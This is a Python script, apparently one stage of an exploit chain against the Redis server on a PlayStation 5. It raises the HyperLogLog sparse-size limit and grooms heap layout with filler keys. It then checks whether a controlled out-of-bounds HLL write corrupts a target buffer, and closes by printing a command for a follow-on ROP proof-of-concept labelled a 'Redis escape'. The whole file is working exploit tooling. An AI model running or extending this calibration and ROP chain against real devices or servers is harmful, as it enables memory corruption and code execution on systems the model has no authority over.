#!/usr/bin/env python3
"""
Redis HLL calibration-only sweep for the PS5 Redis primitive.

This does not spray Lua closures, build ROP, or trigger the module pivot. It
only tests whether the controlled HLL write currently lands inside B for a
range of layout filler counts.
"""
import argparse
import os
import random
import socket
import time

import redis_hll_guarded_probe as hll


DEFAULT_HOST = "192.168.50.192"
DEFAULT_PORT = 1003
AUTO_FILLERS = [15, 0, 13, 14, 16, 12, 17, 10, 18, 20, 8, 22, 24, 30, 40, 60, 80]


def parse_fillers(text):
    text = str(text).strip().lower()
    if text == "auto":
        return AUTO_FILLERS[:]
    if "," in text:
        out = [int(part.strip(), 0) for part in text.split(",") if part.strip()]
        if not out:
            raise ValueError("empty filler list")
        return out
    if ".." in text:
        first_s, last_s = text.split("..", 1)
        first = int(first_s, 0)
        last = int(last_s, 0)
        step = 1 if last >= first else -1
        return list(range(first, last + step, step))
    return [int(text, 0)]


def new_prefix(tag):
    return f"cal{tag}{os.getpid()}{random.randrange(10**10):010d}xxxxxxxx"


def one_probe(host, port, filler, tag, keep=False):
    prefix = new_prefix(tag)
    original_hll_max = None
    sock = socket.create_connection((host, port), timeout=10)
    try:
        print(f"\n[filler={filler}] prefix={prefix}")
        print(f"PING: {hll.cmd(sock, 'PING')}")
        try:
            hll.cmd(sock, "CLIENT", "SETNAME", f"cal-sweep-{os.getpid()}")
        except Exception:
            pass
        original_hll_max = hll.redis_config_get(sock, "hll-sparse-max-bytes")
        print(f"hll-sparse-max-bytes original={original_hll_max}")
        hll.redis_config_set(sock, "hll-sparse-max-bytes", hll.HIGH_HLL_MAX)
        hll.setup_layout(sock, prefix, fillers=filler)
        _b_original, cal, flags_reg, changes = hll.find_calibration(sock, prefix)
        if cal < 0:
            print("MISS: no B byte changed")
            return None
        first = changes[0]
        print(
            f"HIT: cal_byte={cal} flags_reg={flags_reg} changes={len(changes)} "
            f"B+0x{first[0]:04X}: 0x{first[1]:02X}->0x{first[2]:02X}"
        )
        return {
            "filler": filler,
            "cal_byte": cal,
            "flags_reg": flags_reg,
            "changes": len(changes),
        }
    finally:
        try:
            if original_hll_max is not None:
                hll.redis_config_set(sock, "hll-sparse-max-bytes", original_hll_max)
                print(f"hll-sparse-max-bytes restored={original_hll_max}")
        except Exception as exc:
            print(f"[!] config restore failed: {exc}")
        if not keep:
            try:
                hll.cleanup(sock, prefix, include_b=True)
                print("cleanup done")
            except Exception as exc:
                print(f"[!] cleanup failed: {exc}")
        try:
            sock.close()
        except Exception:
            pass


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default=DEFAULT_HOST)
    ap.add_argument("--port", type=int, default=DEFAULT_PORT)
    ap.add_argument("--fillers", default="auto")
    ap.add_argument("--attempts", type=int, default=3)
    ap.add_argument("--stop-on-hit", action="store_true")
    ap.add_argument("--keep", action="store_true")
    args = ap.parse_args()

    fillers = parse_fillers(args.fillers)
    print("=== Redis HLL Calibration Sweep ===")
    print(f"target={args.host}:{args.port} attempts={args.attempts} fillers={','.join(map(str, fillers))}")

    hits = []
    for attempt in range(1, args.attempts + 1):
        print(f"\n=== attempt {attempt}/{args.attempts} ===")
        for filler in fillers:
            try:
                hit = one_probe(args.host, args.port, filler, f"{attempt:02d}{filler:02d}", keep=args.keep)
            except Exception as exc:
                print(f"ERROR: filler={filler}: {exc}")
                hit = None
            if hit:
                hits.append(hit)
                if args.stop_on_hit:
                    break
        if hits and args.stop_on_hit:
            break

    print("\n=== SUMMARY ===")
    if not hits:
        print("NO CALIBRATION HITS")
        print("Redis heap state is not landing C next to B for this profile. Restart SceRedisServer/reboot, then retry.")
        return 2

    for hit in hits:
        print(
            f"HIT filler={hit['filler']} cal_byte={hit['cal_byte']} "
            f"flags_reg={hit['flags_reg']} changes={hit['changes']}"
        )
    best = hits[0]["filler"]
    print("\nSuggested notify run:")
    print(
        "python .\\poc_redis_300_native_rop.py --mode notify --fast --attempts 3 "
        f"--layout-fillers {best} --eggs 512 --notify-text \"Redis escape proof\" "
        "--out-dir .\\poc_runs\\notify"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
